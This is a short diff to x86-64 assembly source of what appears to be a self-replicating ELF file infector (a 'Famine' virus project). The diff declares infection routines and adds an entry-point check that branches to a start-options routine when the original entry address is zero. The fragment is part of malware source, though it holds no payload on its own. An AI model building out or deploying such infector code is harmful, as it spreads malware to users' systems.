@@ -24,6 +24,7 @@ section .text
 	extern _start_infect
 	extern _infect_from_root
     extern _verify_starting_infect
+    extern _famine_start_options
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -55,6 +56,9 @@ _start:
 	push r14 ; +96
 	push r15 ; +104
 
+    lea rax, [rel _o_entry]
+    cmp QWORD [rax], 0
+    je _famine_start_options
 ;;;;;;;;;;;;;;;;;;;;;;
 ;   NULL (8 bytes)   ;
 ;--------------------;
